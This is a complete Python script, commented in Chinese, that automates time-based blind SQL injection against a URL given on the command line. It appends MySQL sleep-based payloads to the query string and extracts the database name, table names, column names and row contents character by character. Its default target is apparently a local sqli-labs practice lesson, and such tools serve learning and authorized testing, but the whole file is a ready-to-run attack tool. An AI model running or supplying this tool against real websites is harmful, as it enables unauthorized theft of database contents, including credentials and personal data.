#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import optparse
import time

# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量，键为字段名，值为字段数据列表
DBData = {}

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

# 盲注主函数
def StartSqli(url):
    # 获取数据库名
    GetDBName(url)
    print(f"[+]当前数据库名:{DBName}")
    # 获取数据库表
    GetDBTables(url, DBName)
    print(f"[+]数据库{DBName}的表如下:")
    for i, table in enumerate(DBTables, start=1):
        print(f"({i}){table}")
    # 让用户输入要查看的表的序号
    tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
    # 获取数据表的字段
    GetDBColumns(url, DBName, DBTables[tableIndex])
    while True:
        print(f"[+]数据表{DBTables[tableIndex]}的字段如下:")
        for i, column in enumerate(DBColumns, start=1):
            print(f"({i}){column}")
        # 让用户输入要查看的字段的序号，输入0退出
        columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):")) - 1
        if columnIndex == -1:
            break
        else:
            # 获取表数据
            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])

# 获取数据库名函数
def GetDBName(url):
    global DBName
    print("[-]开始获取数据库名长度")
    DBNameLen = 0
    # 用于检查数据库名长度的payload
    payload = "' and if(length(database())={0},sleep(5),0) %23"
    # 把URL和payload进行拼接得到最终的请求URL
    targetUrl = url + payload
    # 用for循环来遍历请求，得到数据库名长度
    for DBNameLen in range(1, 99):
        # 记录开始时间
        timeStart = time.time()
        # 发送请求
        res = conn.get(targetUrl.format(DBNameLen))
        # 记录结束时间
        timeEnd = time.time()
        # 判断时间差是否大于等于5秒
        if timeEnd - timeStart >= 5:
            print(f"[+]数据库名长度:{DBNameLen}")
            break
    print("[-]开始获取数据库名")
    payload = "' and if(ascii(substr(database(),{0},1))={1},sleep(5),0)%23"
    targetUrl = url + payload
    # a表示substr()函数的截取起始位置
    for a in range(1, DBNameLen + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            timeStart = time.time()
            res = conn.get(targetUrl.format(a, b))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                DBName += chr(b)
                print(f"[-]{DBName}")
                break

# 获取数据库表函数
def GetDBTables(url, dbname):
    global DBTables
    # 存放数据库表数量的变量
    DBTableCount = 0
    print(f"[-]开始获取{dbname}数据库表数量:")
    # 获取数据库表数量的payload
    payload = "' and if((select count(table_name) from information_schema.tables where table_schema='{0}' )={1},sleep(5),0) %23"
    targetUrl = url + payload
    # 开始遍历获取数据库表的数量
    for DBTableCount in range(1, 99):
        timeStart = time.time()
        res = conn.get(targetUrl.format(dbname, DBTableCount))
        timeEnd = time.time()
        if timeEnd - timeStart >= 5:
            print(f"[+]{dbname}数据库的表数量为:{DBTableCount}")
            break
    print(f"[-]开始获取{dbname}数据库的表")
    # 遍历表名时临时存放表名长度变量
    tableLen = 0
    # a表示当前正在获取表的索引
    for a in range(0, DBTableCount):
        print(f"[-]正在获取第{a + 1}个表名")
        # 先获取当前表名的长度
        for tableLen in range(1, 99):
            payload = "' and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},sleep(5),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = conn.get(targetUrl.format(dbname, a, tableLen))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                break
        # 开始获取表名
        # 临时存放当前表名的变量
        table = ""
        # b表示当前表名猜解的位置
        for b in range(1, tableLen + 1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},sleep(5),0)%23"
            targetUrl = url + payload
            # c表示33~127位ASCII中可显示字符
            for c in range(33, 128):
                timeStart = time.time()
                res = conn.get(targetUrl.format(dbname, a, b, c))
                timeEnd = time.time()
                if timeEnd - timeStart >= 5:
                    table += chr(c)
                    print(table)
                    break
        # 把获取到的名加入到DBTables
        DBTables.append(table)
        # 清空table，用来继续获取下一个表名
        table = ""

# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
    global DBColumns
    # 存放字段数量的变量
    DBColumnCount = 0
    print(f"[-]开始获取{dbtable}数据表的字段数:")
    for DBColumnCount in range(99):
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},sleep(5),0) %23"
        targetUrl = url + payload
        timeStart = time.time()
        res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
        timeEnd = time.time()
        if timeEnd - timeStart >= 5:
            print(f"[-]{dbtable}数据表的字段数为:{DBColumnCount}")
            break
    # 开始获取字段的名称
    # 保存字段名的临时变量
    column = ""
    # a表示当前获取字段的索引
    for a in range(0, DBColumnCount):
        print(f"[-]正在获取第{a + 1}个字段名")
        # 先获取字段的长度
        for columnLen in range(99):
            payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},sleep(5),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                break
        # b表示当前字段名猜解的位置
        for b in range(1, columnLen + 1):
            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},sleep(5),0) %23"
            targetUrl = url + payload
            # c表示33~127位ASCII中可显示字符
            for c in range(33, 128):
                timeStart = time.time()
                res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
                timeEnd = time.time()
                if timeEnd - timeStart >= 5:
                    column += chr(c)
                    print(column)
                    break
        # 把获取到的名加入到DBColumns
        DBColumns.append(column)
        # 清空column，用来继续获取下一个字段名
        column = ""

# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
    global DBData
    # 先获取字段数据数量
    DBDataCount = 0
    print(f"[-]开始获取{dbtable}表{dbcolumn}字段的数据数量")
    for DBDataCount in range(99):
        payload = "' and if((select count({0}) from {1})={2},sleep(5),0) %23"
        targetUrl = url + payload
        timeStart = time.time()
        res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
        timeEnd = time.time()
        if timeEnd - timeStart >= 5:
            print(f"[-]{dbtable}表{dbcolumn}字段的数据数量为:{DBDataCount}")
            break
    for a in range(0, DBDataCount):
        print(f"[-]正在获取{dbcolumn}的第{a + 1}个数据")
        # 先获取这个数据的长度
        dataLen = 0
        for dataLen in range(99):
            payload = "'and  if((select length({0}) from {1} limit {2},1)={3},sleep(5),0) %23"
            targetUrl = url + payload
            timeStart = time.time()
            res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                print(f"[-]第{a + 1}个数据长度为:{dataLen}")
                break
        # 临时存放数据内容变量
        data = ""
        # 开始获取数据的具体内容
        # b表示当前数据内容猜解的位置
        for b in range(1, dataLen + 1):
            for c in range(33, 128):
                payload = "' and  if(ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},sleep(5),0) %23"
                targetUrl = url + payload
                timeStart = time.time()
                res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
                timeEnd = time.time()
                if timeEnd - timeStart >= 5:
                    data += chr(c)
                    print(data)
                    break
        # 放到以字段名为键，值为列表的字典中存放
        DBData.setdefault(dbcolumn, []).append(data)
        print(DBData)
        # 把data清空来，继续获取下一个数据
        data = ""

if __name__ == '__main__':
    # 创建命令行参数解析器
    parser = optparse.OptionParser('usage: python %prog -u url \n\n'
                                   'Example: python %prog -u http://192.168.61.1/sql/Less-9/?id=1\n')
    # 添加目标URL参数
    parser.add_option('-u', '--url', dest='targetURL', default='http://127.0.0.1/sql/Less-9/?id=1', type='string',
                      help='target URL')
    # 解析命令行参数
    (options, args) = parser.parse_args()
    # 调用盲注主函数
    StartSqli(options.targetURL)